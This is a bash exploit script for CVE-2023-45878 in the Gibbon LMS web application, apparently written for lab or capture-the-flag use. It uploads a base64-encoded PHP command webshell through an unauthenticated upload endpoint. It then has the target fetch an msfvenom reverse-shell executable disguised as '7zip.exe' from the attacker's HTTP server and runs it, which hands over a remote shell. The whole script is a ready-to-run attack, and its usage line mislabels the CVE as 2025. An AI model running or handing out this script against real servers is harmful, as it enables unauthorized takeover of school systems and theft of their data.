#!/bin/bash

# CVE-2023-45878
# The script performs the following steps:
# 1. Generates an msfvenom stageless reverse shell for Windows
# 2. Uploads a webshell exploiting CVE-2023-45878
# 3. Downloads the reverse shell on the target
# 4. Executes the reverse shell

if [[ -z $1 || -z $2 || -z $3 ]];then
    echo -e "Usage: CVE-2025-45878.sh <lhost> <lport> <rhost[:rport]>"
    exit 1
fi

grn="\e[32m"
yel="\e[33m"
red="\e[31m"
rst="\e[0m"

lhost=$1
lport=$2
rhost=$3
revshell_name="7zip.exe"
py_http_srv_port=80
webshell_name=gibbon_myconfig.php

echo -e "${grn}Generating TCP reverse shell${rst}"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $revshell_name
echo -e "${grn}TCP reverse shell generated: $revshell_name${rst}"

echo -e "${grn}Spawining a webshell on the target${rst}"
response=$(curl -s -X POST http://$rhost/Gibbon-LMS//modules/Rubrics/rubrics_visualise_saveAjax.php  \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=$webshell_name&gibbonPersonID=0000000001")
echo -e "${grn}Shell available at http://$rhost/Gibbon-LMS/$webshell_name?cmd=whoami${rst}"


python -m http.server $py_http_srv_port > /dev/null &
pid=$(ps aux | grep '[p]ython -m http.server 80' | awk '{print $2}')
echo -e "${grn}Python http.server started on port $py_http_srv_port - PID: $pid${rst}"

# powershell -c "Invoke-webrequest http://10.10.14.223/7zip.exe -outfile 7zip.exe"
payload="powershell%20-c%20%22Invoke-webrequest%20http://$lhost:$py_http_srv_port/$revshell_name%20-outfile%20$revshell_name%22"
curl -s http://$rhost/Gibbon-LMS/$webshell_name?cmd=$payload
echo -e "${grn}Reverse shell uploaded${rst}"
kill -9 $pid
sleep 2

echo -e "${grn}Start a listener on port ${lport}, press ENTER when you are ready to execute the reverse shell on the target.${rst}"
echo -e "Netcat:${yel} nc -lnvp ${lport}${rst}"
echo -e "Msfconsole: $red use exploit/multi/handler${rst};${red} set lhost ${lhost}${rst};${red} set lport ${lport}${rst};${red} run${rst}" 
read

payload=".\\\\$revshell_name"
curl -s "http://$rhost/Gibbon-LMS/$webshell_name?cmd=$payload"
echo -e "${grn}Reverse shell executed on the target${rst}"